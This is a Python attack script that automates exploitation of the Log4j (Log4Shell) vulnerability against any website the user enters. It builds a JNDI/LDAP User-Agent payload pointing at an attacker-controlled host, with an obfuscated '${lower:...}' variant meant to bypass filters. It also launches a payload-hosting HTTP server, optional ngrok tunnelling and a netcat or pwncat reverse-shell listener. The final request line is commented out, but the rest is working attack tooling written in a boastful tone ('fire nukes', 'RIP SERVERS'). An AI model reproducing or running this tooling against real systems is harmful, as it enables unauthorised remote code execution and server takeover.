import requests, os
from time import sleep
import pprint
import subprocess
import appscript
import platform

from requests.api import request


banner = "made with love by thepwn3r /.<3./"

# pwn cat!
pc = input("do you use pwncat? (y/n) ~> ")
if pc == "y":
    print("okay, setting pwncat as reverse shell handler...")
    sleep(1)
    os.system('clear')
else:
    print("thats a shame, you should!")
    print("setting nc as your reverse shell handler")
    sleep(2)
    os.system('clear')

#target, duh
website = input('website ~> ')

#name the payload to be used
payload = input('*case and ext sensitive* shell name ~> ')

#adding URL scheme to website so you don't have to
https_website = 'https://' + website
testing_waters = requests.get(https_website)
result = testing_waters.status_code

#making sure the website is valid
if result == 200:

    print("checking if website is reachable...")
    sleep(2)
    os.system("clear")
    print("-" * 50)
    print(f"[{result}] -> {https_website}")
    print("-" * 50)
    print("success! continueing...")
    x = 0
else:
    print(f"website returned {result}, expected 200")
    add_http = input("try using http? (y/n) ~> ")
    if add_http == "y" or "yes":
        http_website = "http://" + website
        testing = requests.get(http_website)
        if testing.status_code == 200:
            print("success! using http...")
            x = 1 #started using X to keep track of http or https
        else:
            print("website still unreachable.. exiting...")
            exit

if x == 1:
    final_website = http_website
else:
    final_website = https_website

#setting up useragent to trigger Log4j
server_ip = input("server ip address ~> ")
server_port = input("server port ~> ")
head_data = {"User-Agent":"$" + "{" + f"jndi:ldap://{server_ip}/{payload}" + "}"}
bypasses_flag = input("try bypasses? (y/n) ~> ")

bypass_lower = "${${lower:j}ndi" + ":${lower:l" + "}${lower:d" + "}a${lower" + ":p}" + f"://{server_ip}/{payload}"

if bypasses_flag == "y":
    head_data = {"User-Agent": bypass_lower}
else:
    pass

# now time to start the server
oS = platform.system()
if oS == "Darwin":
    Z = 1
    appscript.app('Terminal').do_script(f"python3 -m http.server {server_port} -b {server_ip}")
else:
    pass

if oS == "Linux":
    Z = 2
    subprocess.call(['gnome-terminal', '-x', f'python3 -m http.server {server_port} -b {server_ip}'])
else:
    pass

if oS == "Windows":
    Z = 3
    subprocess.call(f'python3 -m http.server {server_port} -b {server_ip}', creationflags=subprocess.CREATE_NEW_CONSOLE)
else:
  pass

#config ngrok
nj = input("do you want to use ngrok? (y/n) ~> ")
if nj == "y":
    if Z == 1:
        appscript.app('Terminal').do_script(f"./ngrok http {server_port}")
    if Z == 2:
        subprocess.call(['gnome-terminal', '-x', f"./ngrok http {server_port}"])
    if Z == 3:
        subprocess.call(f'ngrok.exe http {server_port}', creationflags=subprocess.CREATE_NEW_CONSOLE)
    
    ngrok_url = input("what is your ngrok url ~> ")
    head_data = {"User-Agent":"$" + "{" + f"jndi:ldap://{ngrok_url}/{payload}" + "}"}

    if bypasses_flag == "y":
        bypass_lower_ngrok = "${${lower:j}ndi" + ":${lower:l" + "}${lower:d" + "}a${lower" + ":p}" + f"://{ngrok_url}/{payload}"
        head_data = {"User-Agent":bypass_lower_ngrok}
    else:
        pass

os.system("clear")
print("-" * 100)
print("payload configured!")
print("-" * 100)
print(f"[payload] -> {payload}")
print(f"[headers] -> {head_data}")
print(f"[target] -> {final_website}")
print(f"[attack ip & port] -> {server_ip}:{server_port}")
print("-" * 100)

attack_port = input("port to run listener on? -> ")
#starting listener
if Z == 1:
    if pc == "y":
        appscript.app('Terminal').do_script(f"pwncat -lp {attack_port}")
    else:
        appscript.app('Terminal').do_script(f"netcat -lvnp {attack_port}")
if Z == 2:
    if pc == "y":
        subprocess.call(['gnome-terminal', '-x', f"pwncat -lp {attack_port}"])
    else:
        subprocess.call(['gnome-terminal', '-x', f"nc -lvnp {attack_port}"])
if Z == 3:
    if pc == "y":
        subprocess.call(f'pwncat.exe -lp {attack_port}', creationflags=subprocess.CREATE_NEW_CONSOLE)
    else:
        subprocess.call(f'netcat.exe -lvnp {attack_port}', creationflags=subprocess.CREATE_NEW_CONSOLE)

os.system('clear')
print("-" * 100)
print(f"[payload] -> {payload}")
print(f"[headers] -> {head_data}")
print(f"[target] -> {final_website}")
print(f"[attack ip & port] -> {server_ip}:{server_port}")
print(f"[listener port] -> {attack_port}")
print("-" * 100)
print("attack ready.")
DEATH_BUTTON = input("fire nukes? (y/n) ~> ")
if DEATH_BUTTON == "y":
    print('RIP SERVERS')
   # r = requests.get(final_website, headers=head_data)
    sleep(2)
    print("Request sent... you should be seeing haxor things in the other windows...")
else:
    print("boring....")
    exit()
###    Debugging code       ###
# print(head_data)            #
# pp.pprint(r.status_code)    #
###                         ### 